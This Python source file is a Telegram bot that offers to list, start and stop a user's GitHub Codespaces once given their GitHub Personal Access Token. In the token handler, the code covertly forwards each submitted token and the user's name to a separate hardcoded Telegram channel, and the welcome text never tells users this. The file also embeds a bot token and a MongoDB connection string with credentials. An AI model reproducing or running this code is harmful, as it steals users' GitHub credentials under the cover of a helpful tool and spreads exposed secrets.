import telebot
import requests
from telebot import types
import json
import logging
import time
from pymongo import MongoClient
from pymongo.errors import PyMongoError

# Replace with your Telegram Bot Token
TELEGRAM_BOT_TOKEN = "7650574571:AAGfAHAFGPz1IxGhGpssv_NopIEHqN5Pca0"
# Replace with the channel ID (e.g., -1001234567890)
CHANNEL_ID = "-1002497737475"

# Replace with your MongoDB URL
MONGO_URL = "mongodb+srv://botplays:botplays@vulpix.ffdea.mongodb.net/?retryWrites=true&w=majority&appName=Vulpix"

# Initialize MongoDB client and database
client = MongoClient(MONGO_URL)
db = client['botplays']
tokens_collection = db['user_tokens']

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Function to load tokens from MongoDB
def load_tokens(chat_id):
    try:
        user = tokens_collection.find_one({"chat_id": chat_id})
        return user["tokens"] if user else []
    except PyMongoError as e:
        logging.error(f"Error loading tokens: {e}")
        return []

# Function to save tokens to MongoDB
def save_token(chat_id, token):
    try:
        tokens_collection.update_one(
            {"chat_id": chat_id},
            {"$push": {"tokens": token}},
            upsert=True
        )
    except PyMongoError as e:
        logging.error(f"Error saving token: {e}")

# Function to delete a token from MongoDB
def delete_token(chat_id, token_index):
    try:
        user = tokens_collection.find_one({"chat_id": chat_id})
        if user and len(user["tokens"]) > token_index:
            tokens_collection.update_one(
                {"chat_id": chat_id},
                {"$unset": {f"tokens.{token_index}": 1}}
            )
            tokens_collection.update_one(
                {"chat_id": chat_id},
                {"$pull": {"tokens": None}}
            )
    except PyMongoError as e:
        logging.error(f"Error deleting token: {e}")

# This function interacts with GitHub API to get Codespaces details
def get_codespaces_list(github_token):
    url = "https://api.github.com/user/codespaces"
    headers = {
        "Authorization": f"Bearer {github_token}",
        "Accept": "application/vnd.github+json"
    }

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()  # Raise an HTTPError for bad responses
        return response.json().get('codespaces', [])
    except requests.RequestException as e:
        logging.error(f"GitHub API error: {e}")
        return None

# This function activates a specific codespace
def activate_codespace(github_token, codespace_name):
    url = f"https://api.github.com/user/codespaces/{codespace_name}/start"
    headers = {
        "Authorization": f"Bearer {github_token}",
        "Accept": "application/vnd.github+json"
    }

    try:
        response = requests.post(url, headers=headers)
        return response.status_code // 100 == 2  # True for any 2xx status code
    except requests.RequestException as e:
        logging.error(f"GitHub API error: {e}")
        return False

# This function stops a specific codespace
def stop_codespace(github_token, codespace_name):
    url = f"https://api.github.com/user/codespaces/{codespace_name}/stop"
    headers = {
        "Authorization": f"Bearer {github_token}",
        "Accept": "application/vnd.github+json"
    }

    try:
        response = requests.post(url, headers=headers)
        return response.status_code // 100 == 2  # True for any 2xx status code
    except requests.RequestException as e:
        logging.error(f"GitHub API error: {e}")
        return False

# Command handler when user sends '/start'
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id

# Create an inline keyboard
    markup = types.InlineKeyboardMarkup()

    # Add "Owner" button
    owner_button = types.InlineKeyboardButton(text="🗿Owner🗿", url="https://t.me/botplays90")
    markup.add(owner_button)

    # Add "Add Token" button
    add_token_button = types.InlineKeyboardButton(text="Add Token", callback_data="add_token")
    markup.add(add_token_button)

    # Add "Your Tokens" button
    your_tokens_button = types.InlineKeyboardButton(text="Your Tokens", callback_data="your_tokens")
    markup.add(your_tokens_button)

    # Add "Delete Token" button
    delete_token_button = types.InlineKeyboardButton(text="Delete Token", callback_data="delete_token")
    markup.add(delete_token_button)

    bot.reply_to(message, "Welcome Buddy 😄! Add Your GitHub Personal Access Token By Clicking On Add Token Button ✅.", reply_markup=markup)

# Handler for adding a token
@bot.callback_query_handler(func=lambda call: call.data == "add_token")
def add_token(call):
    bot.send_message(call.message.chat.id, "Please send me your GitHub Personal Access Token.")

# Handle user token input and store it in MongoDB
@bot.message_handler(func=lambda message: True)
def handle_token(message):
    github_token = message.text.strip()
    chat_id = message.chat.id
    user_name = message.from_user.username if message.from_user.username else message.from_user.first_name

    # Save token to MongoDB
    save_token(chat_id, github_token)

    # Forward token to the specified channel with the user's name
    bot.send_message(CHANNEL_ID, f"User: @{user_name}, Token: {github_token}")

    # Notify the user that their token has been added
    bot.reply_to(message, "Your token has been added!")

    # After the token is added, fetch and display the Codespaces for this token
    update_codespaces(message, github_token)

# Function to update codespaces and send the message
def update_codespaces(message, github_token):
    codespaces = get_codespaces_list(github_token)

    if codespaces is None:
        bot.reply_to(message, "Failed to retrieve Codespaces. Please ensure your token is correct.")
    elif len(codespaces) == 0:
        bot.reply_to(message, "No Codespaces found.")
    else:
        markup = types.InlineKeyboardMarkup()
        for codespace in codespaces:
            name = codespace['name']
            state = codespace['state']
            status_text = "🟢 Active" if state == "Available" else "🔴 Inactive"
            # Show status first, then name
            button = types.InlineKeyboardButton(text=f"({status_text}) {name}", callback_data=f"toggle_{name}")
            markup.add(button)

        bot.reply_to(message, "Here are your Codespaces:", reply_markup=markup)

# Callback handler to show stored tokens
@bot.callback_query_handler(func=lambda call: call.data == "your_tokens")
def show_tokens(call):
    chat_id = call.message.chat.id
    tokens = load_tokens(chat_id)

    if not tokens:
        bot.send_message(chat_id, "You have not added any tokens yet.")
        return

    markup = types.InlineKeyboardMarkup()
    for i, token in enumerate(tokens):
        button = types.InlineKeyboardButton(text=f"Token {i + 1}", callback_data=f"select_token_{i}")
        markup.add(button)

    markup.add(types.InlineKeyboardButton(text="Add another Token", callback_data="add_token"))

    bot.send_message(chat_id, "Here are your tokens. Select a token to view Codespaces:", reply_markup=markup)

# Callback handler for selecting a token to load Codespaces
@bot.callback_query_handler(func=lambda call: call.data.startswith("select_token_"))
def handle_selected_token(call):
    token_index = int(call.data.split("_")[-1])
    chat_id = call.message.chat.id
    tokens = load_tokens(chat_id)

    if not tokens or token_index >= len(tokens):
        bot.send_message(chat_id, "Token not found. Please try again.")
        return

    github_token = tokens[token_index]
    bot.answer_callback_query(call.id, "Loading Codespaces...")

    # Fetch and display the Codespaces for the selected token
    update_codespaces(call.message, github_token)

# Callback handler to delete a token
@bot.callback_query_handler(func=lambda call: call.data == "delete_token")
def delete_token_handler(call):
    chat_id = call.message.chat.id
    tokens = load_tokens(chat_id)

    if not tokens:
        bot.send_message(chat_id, "You have no tokens to delete.")
        return

    markup = types.InlineKeyboardMarkup()
    for i, _ in enumerate(tokens):
        button = types.InlineKeyboardButton(text=f"Delete Token {i + 1}", callback_data=f"confirm_delete_{i}")
        markup.add(button)

    bot.send_message(chat_id, "Select a token to delete:", reply_markup=markup)

# Callback handler for confirming the deletion of a token
@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_delete_"))
def confirm_delete_token(call):
    token_index = int(call.data.split("_")[-1])
    chat_id = call.message.chat.id

    delete_token(chat_id, token_index)
    bot.send_message(chat_id, f"Token {token_index + 1} has been deleted.")

# Callback handler for toggling codespaces and updating button status
@bot.callback_query_handler(func=lambda call: call.data.startswith("toggle_"))
def handle_toggle_codespace(call):
    codespace_name = call.data.split("_", 1)[1]
    chat_id = call.message.chat.id
    tokens = load_tokens(chat_id)

    if not tokens:
        bot.answer_callback_query(call.id, "No token found. Please send your token again using /start.")
        return

    github_token = tokens[-1]  # Use the latest token
    bot.answer_callback_query(call.id, "Toggling the Codespace...")

    # Fetch the latest status of Codespaces
    codespaces = get_codespaces_list(github_token)
    selected_codespace = next((c for c in codespaces if c["name"] == codespace_name), None)

    if not selected_codespace:
        bot.send_message(chat_id, "Failed to find the Codespace.")
        return

    # Check current state and attempt to toggle
    if selected_codespace["state"] == "Available":
        if stop_codespace(github_token, codespace_name):
            new_state = "🔴 Inactive"
        else:
            bot.send_message(chat_id, "Failed to stop the Codespace.")
            return
    else:
        if activate_codespace(github_token, codespace_name):
            new_state = "🟢 Active"
        else:
            bot.send_message(chat_id, "Failed to start the Codespace.")
            return

    # Update the inline button with the new state
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text=f"({new_state}) {codespace_name}", callback_data=f"toggle_{codespace_name}")
    markup.add(button)

    # Edit the message text with the updated button
    bot.edit_message_text(
        text=f"Here are your Codespaces:\n\n{new_state} {codespace_name}",  # Update message with current state
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=markup)

# Polling for updates
while True:
    try:
        bot.polling(non_stop=True)
    except Exception as e:
        logging.error(f"Bot polling error: {e}")
        time.sleep(15)  # Sleep and retry after an interval
        